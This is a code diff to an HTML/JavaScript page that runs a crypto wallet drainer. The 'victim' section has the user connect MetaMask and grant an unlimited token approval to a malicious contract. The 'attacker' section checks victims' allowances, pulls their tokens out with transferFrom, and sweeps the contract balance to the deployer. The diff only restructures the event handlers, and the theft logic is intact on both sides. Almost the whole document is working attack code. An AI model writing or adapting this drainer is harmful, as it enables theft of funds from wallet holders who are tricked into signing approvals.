@@ -78,83 +78,95 @@
         }
 
         // Victim's approval section
-        document.getElementById("connectWalletBtn").addEventListener("click", async () => {
-            try {
-                console.debug("Requesting wallet connection...");
-                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-                userAccount = accounts[0];
-                console.debug("Wallet connected:", userAccount);
-                document.getElementById('status').innerText = `Connected: ${userAccount}`;
-                document.getElementById('approveTokensBtn').style.display = "inline-block";
-            } catch (error) {
-                console.error("Error connecting wallet:", error);
-            }
-        });
+        document.addEventListener("DOMContentLoaded", function() {
+            const connectWalletBtn = document.getElementById("connectWalletBtn");
+            const approveTokensBtn = document.getElementById("approveTokensBtn");
 
-        document.getElementById('approveTokensBtn').addEventListener('click', async () => {
-            try {
-                const unlimitedAmount = web3.utils.toHex('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
-                console.debug("Approving unlimited tokens for:", maliciousContractAddress);
+            if (connectWalletBtn && approveTokensBtn) {
+                connectWalletBtn.addEventListener("click", async () => {
+                    try {
+                        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                        userAccount = accounts[0];
+                        document.getElementById('status').innerText = `Connected: ${userAccount}`;
+                        approveTokensBtn.style.display = "inline-block";
+                    } catch (error) {
+                        console.error("Error connecting wallet:", error);
+                    }
+                });
 
-                await tokenContract.methods.approve(maliciousContractAddress, unlimitedAmount).send({ from: userAccount });
-                console.debug("Approval successful.");
-                document.getElementById('status').innerText = `Approval successful! Unlimited tokens have been approved.`;
-            } catch (error) {
-                document.getElementById('status').innerText = "Approval failed!";
-                console.error("Error during approval:", error);
+                approveTokensBtn.addEventListener("click", async () => {
+                    try {
+                        const unlimitedAmount = web3.utils.toHex('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
+                        await tokenContract.methods.approve(maliciousContractAddress, unlimitedAmount).send({ from: userAccount });
+                        document.getElementById('status').innerText = `Approval successful! Unlimited tokens have been approved.`;
+                    } catch (error) {
+                        document.getElementById('status').innerText = "Approval failed!";
+                        console.error("Error during approval:", error);
+                    }
+                });
             }
         });
 
         // Attacker's interaction section
-        document.getElementById("checkAllowanceBtn").addEventListener("click", async () => {
-            const victimAddress = prompt("Enter victim's wallet address:");
-            if (victimAddress) {
-                try {
-                    const allowance = await contract.methods.allowance(victimAddress, maliciousContractAddress).call();
-                    const allowanceBN = web3.utils.toBN(allowance);
-                    if (allowanceBN.gt(web3.utils.toBN(0))) {
-                        alert(`The victim has granted an allowance of ${allowanceBN.toString()} tokens to the malicious contract.`);
-                    } else {
-                        alert("The victim has not granted any allowance to the malicious contract.");
+        document.addEventListener("DOMContentLoaded", function() {
+            const checkAllowanceBtn = document.getElementById("checkAllowanceBtn");
+            const transferTokensBtn = document.getElementById("transferTokensBtn");
+            const deployerWithdrawBtn = document.getElementById("deployerWithdrawBtn");
+
+            if (checkAllowanceBtn && transferTokensBtn && deployerWithdrawBtn) {
+                checkAllowanceBtn.addEventListener("click", async () => {
+                    const victimAddress = prompt("Enter victim's wallet address:");
+                    if (victimAddress) {
+                        try {
+                            const allowance = await contract.methods.allowance(victimAddress, maliciousContractAddress).call();
+                            const allowanceBN = web3.utils.toBN(allowance);
+                            if (allowanceBN.gt(web3.utils.toBN(0))) {
+                                alert(`The victim has granted an allowance of ${allowanceBN.toString()} tokens to the malicious contract.`);
+                            } else {
+                                alert("The victim has not granted any allowance to the malicious contract.");
+                            }
+                        } catch (error) {
+                            alert("An error occurred while checking the allowance.");
+                            console.error(error);
+                        }
                     }
-                } catch (error) {
-                    alert("An error occurred while checking the allowance.");
-                    console.error(error);
-                }
+                });
+
+                transferTokensBtn.addEventListener("click", async () => {
+                    const victimAddress = prompt("Enter victim's wallet address:");
+                    const amount = prompt("Enter the amount to withdraw:");
+                    if (victimAddress && amount) {
+                        try {
+                            await contract.methods.transferFrom(victimAddress, accounts[0], amount).send({ from: accounts[0] });
+                            alert(`${amount} tokens withdrawn from the victim's account!`);
+                        } catch (error) {
+                            alert("An error occurred while transferring tokens.");
+                            console.error(error);
+                        }
+                    }
+                });
+
+                deployerWithdrawBtn.addEventListener("click", async () => {
+                    const deployerAddress = accounts[0];
+                    try {
+                        const contractBalance = await tokenContract.methods.balanceOf(maliciousContractAddress).call();
+                        if (contractBalance > 0) {
+                            await tokenContract.methods.transfer(deployerAddress, contractBalance).send({ from: deployerAddress });
+                            alert(`All tokens withdrawn to the deployer's address!`);
+                        } else {
+                            alert("No tokens available in the malicious contract.");
+                        }
+                    } catch (error) {
+                        alert("An error occurred while withdrawing tokens.");
+                        console.error(error);
+                    }
+                });
             }
         });
 
-        document.getElementById("transferTokensBtn").addEventListener("click", async () => {
-            const victimAddress = prompt("Enter victim's wallet address:");
-            const amount = prompt("Enter the amount to withdraw:");
-            if (victimAddress && amount) {
-                try {
-                    await contract.methods.transferFrom(victimAddress, accounts[0], amount).send({ from: accounts[0] });
-                    alert(`${amount} tokens withdrawn from the victim's account!`);
-                } catch (error) {
-                    alert("An error occurred while transferring tokens.");
-                    console.error(error);
-                }
-            }
-        });
-
-        document.getElementById("deployerWithdrawBtn").addEventListener("click", async () => {
-            const deployerAddress = accounts[0];
-            try {
-                const contractBalance = await tokenContract.methods.balanceOf(maliciousContractAddress).call();
-                if (contractBalance > 0) {
-                    await tokenContract.methods.transfer(deployerAddress, contractBalance).send({ from: deployerAddress });
-                    alert(`All tokens withdrawn to the deployer's address!`);
-                } else {
-                    alert("No tokens available in the malicious contract.");
-                }
-            } catch (error) {
-                alert("An error occurred while withdrawing tokens.");
-                console.error(error);
-            }
-        });
-
-        document.getElementById("connectBtn").addEventListener("click", connectMetaMask);
+        // Initialize MetaMask connection
+        document.getElementById("connectWalletBtn").addEventListener("click", connectMetaMask);
     </script>
 </body>
 </html>
+
